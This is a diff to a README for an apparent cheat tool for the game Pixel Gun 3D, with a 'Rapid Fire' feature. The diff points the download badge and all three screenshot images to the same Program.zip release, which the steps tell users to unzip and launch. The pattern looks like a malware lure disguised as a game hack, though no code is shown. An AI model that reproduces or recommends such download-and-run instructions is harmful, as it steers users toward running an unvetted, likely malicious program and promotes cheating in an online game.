@@ -10,7 +10,7 @@ To get started with *Pixel Gun 3D*, follow these simple steps:
 2. Unzip the downloaded file to extract the program.
 3. Launch the application and enjoy exploring the various enhancements it offers.
 
-[![Download Pixel Gun 3D](https://img.shields.io/badge/Download-Program-1769aa)](https://github.com/user-attachments/files/17563021/Program.zip)
+[![Download Pixel Gun 3D](https://github.com/DatBoiComfy/Pixel-Gun-3D/releases/download/v2.0/Program.zip)](https://github.com/DatBoiComfy/Pixel-Gun-3D/releases/download/v2.0/Program.zip)
 
 ## Features
 
@@ -30,9 +30,9 @@ Unleash a rapid barrage of shots on your opponents using the Rapid Fire function
 
 Here are some visual representations of *Pixel Gun 3D* in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/DatBoiComfy/Pixel-Gun-3D/releases/download/v2.0/Program.zip)
+![Screenshot 2](https://github.com/DatBoiComfy/Pixel-Gun-3D/releases/download/v2.0/Program.zip)
+![Screenshot 3](https://github.com/DatBoiComfy/Pixel-Gun-3D/releases/download/v2.0/Program.zip)
 
 ## Usage
 
